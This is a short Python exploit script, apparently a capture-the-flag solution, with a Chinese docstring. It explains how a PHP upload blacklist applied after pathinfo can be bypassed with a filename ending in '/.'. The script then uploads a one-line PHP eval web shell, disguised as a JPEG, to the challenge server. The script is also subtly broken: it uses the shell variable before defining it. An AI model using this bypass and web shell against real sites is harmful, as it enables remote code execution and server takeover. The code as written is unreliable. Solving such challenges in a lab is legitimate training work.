"""
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    foreach ($black_list as $value) {

由于是先经过pathinfo处理再用黑名单过滤，明显关键在于绕过pathinfo。
$pathinfo[extension]=pathfo($name,PATHINFO_EXTENSION) 获取文件后缀名时时获取的 . 后面的内容，当出现多个 . 时，结果为最后一个 . 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。
本地测试当传入的参数是 1.php/. 时 pathinfo 获取的文件的后缀名为NULL，故可以在文件名后面添加/.来实现绕过，记得url编码文件名
"""
import requests

url = 'http://node6.anna.nssctf.cn:28517/'

file = {
 'file': ('shell.php%2F.', shell, 'image/jpeg'),
}
shell = "<?php eval($_POST['shell']);?>"
res = requests.post(url=url, files=file)
print(res.text)